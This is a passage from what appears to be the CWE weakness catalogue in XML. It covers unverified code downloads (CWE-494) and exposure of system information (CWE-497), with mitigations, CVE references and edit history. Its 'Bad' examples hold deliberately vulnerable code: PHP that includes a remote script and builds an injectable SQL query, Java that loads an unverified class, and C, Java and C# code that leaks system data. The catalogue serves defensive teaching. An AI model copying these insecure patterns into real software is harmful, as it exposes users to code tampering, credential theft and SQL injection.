            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>Other</Impact>
               <Note>Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.4">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.</xhtml:p>
               </Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-42">
               <Phase>Implementation</Phase>
               <Description>Perform proper forward and reverse DNS lookups to detect DNS spoofing.</Description>
               <Effectiveness_Notes>This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>
                  <xhtml:p>Encrypt the code with a reliable encryption scheme before transmitting.</xhtml:p>
                  <xhtml:p>This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.</xhtml:li>
                        <xhtml:li>Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example loads an external class from a local subdirectory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>URL[] classURLs= new URL[]{<xhtml:div style="margin-left:1em;">new URL("file:subdir/")</xhtml:div>};<xhtml:br/>URLClassLoader loader = new URLClassLoader(classURLs);<xhtml:br/>Class loadedClass = Class.forName("loadMe", true, loader);</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:i>//assume the password is already encrypted, avoiding CWE-312</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>function authenticate($username,$password){<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>include("http://external.example.com/dbInfo.php");<xhtml:br/>
                        <xhtml:br/>
                        <xhtml:i>//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available</xhtml:i>
                        <xhtml:br/>mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');<xhtml:br/>mysql_select_db($dbname);<xhtml:br/>$query = 'Select * from users where username='.$username.' And password='.$password;<xhtml:br/>$result = mysql_query($query);<xhtml:br/>
                        <xhtml:br/>if(mysql_numrows($result) == 1){<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">mysql_close();<xhtml:br/>return false;</xhtml:div>}</xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account.</Body_Text>
               <Body_Text>This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-9534</Reference>
               <Description>Satellite phone does not validate its firmware image.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-9534</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22909</Reference>
               <Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3438</Reference>
               <Description>OS does not verify authenticity of its own updates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3438</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3324</Reference>
               <Description>online poker client does not verify authenticity of its own updates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3324</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1125</Reference>
               <Description>anti-virus product does not verify automatic updates for itself.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1125</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0671</Reference>
               <Description>VOIP phone downloads applications from web sites without verifying integrity.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0671</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Invoking untrusted mobile code</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP27</Entry_ID>
               <Entry_Name>Tainted input to environment</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="184"/>
            <Related_Attack_Pattern CAPEC_ID="185"/>
            <Related_Attack_Pattern CAPEC_ID="186"/>
            <Related_Attack_Pattern CAPEC_ID="187"/>
            <Related_Attack_Pattern CAPEC_ID="533"/>
            <Related_Attack_Pattern CAPEC_ID="538"/>
            <Related_Attack_Pattern CAPEC_ID="657"/>
            <Related_Attack_Pattern CAPEC_ID="662"/>
            <Related_Attack_Pattern CAPEC_ID="691"/>
            <Related_Attack_Pattern CAPEC_ID="692"/>
            <Related_Attack_Pattern CAPEC_ID="693"/>
            <Related_Attack_Pattern CAPEC_ID="695"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-454"/>
            <Reference External_Reference_ID="REF-455"/>
            <Reference External_Reference_ID="REF-456"/>
            <Reference External_Reference_ID="REF-457"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 18: The Sins of Mobile Code.&#34; Page 267"/>
            <Reference External_Reference_ID="REF-459"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Notes>
            <Note Type="Research Gap">This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Other_Notes, Potential_Mitigations, References, Relationships, Research_Gaps, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Mobile Code: Invoking Untrusted Mobile Code</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Download of Untrusted Mobile Code Without Integrity Check</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="497" Name="Exposure of Sensitive System Information to an Unauthorized Control Sphere" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.</Description>
         <Extended_Description><xhtml:p>Network-based products, such as web applications, often run on top of an operating system or similar environment.  When the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other OS users, installed packages, the application environment, etc. This system information may be provided by the product itself, or buried within diagnostic or debugging messages. Debugging information helps an adversary learn about the system and form an attack plan.</xhtml:p>
	 <xhtml:p>An information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. Using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts.  An attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. A product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.</xhtml:p></Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code prints the path environment variable to the standard error stream:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char* path = getenv("PATH");<xhtml:br/>...<xhtml:br/>sprintf(stderr, "cannot find exe on path %s\n", path);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-68">
               <Intro_Text>This code prints all of the running processes belonging to the current user.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78)</xhtml:i>
                     <xhtml:br/>$userName = getCurrentUser();<xhtml:br/>$command = 'ps aux | grep ' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code prints an exception to the standard error stream:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">...</xhtml:div>} catch (Exception e) {<xhtml:div style="margin-left:1em;">e.printStackTrace();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">...</xhtml:div>} catch (Exception e) {<xhtml:div style="margin-left:1em;">Console.Writeline(e);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system will be vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>string cs="database=northwind; server=mySQLServer...";<xhtml:br/>SqlConnection conn=new SqlConnection(cs);<xhtml:br/>...<xhtml:br/>Console.Writeline(cs);</xhtml:div>
               </Example_Code>
               <Body_Text>Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>System Information Leak</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>ERR01-J</Entry_ID>
               <Entry_Name>Do not allow exceptions to expose sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="170"/>
            <Related_Attack_Pattern CAPEC_ID="694"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">System Information Leak</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-12-28">Information Leak of System Data</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Exposure of System Data to an Unauthorized Control Sphere</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="501" Name="Trust Boundary Violation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product mixes trusted and untrusted data in the same data structure or structured message.</Description>
         <Extended_Description>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.</Extended_Description>
         <Related_Weaknesses>
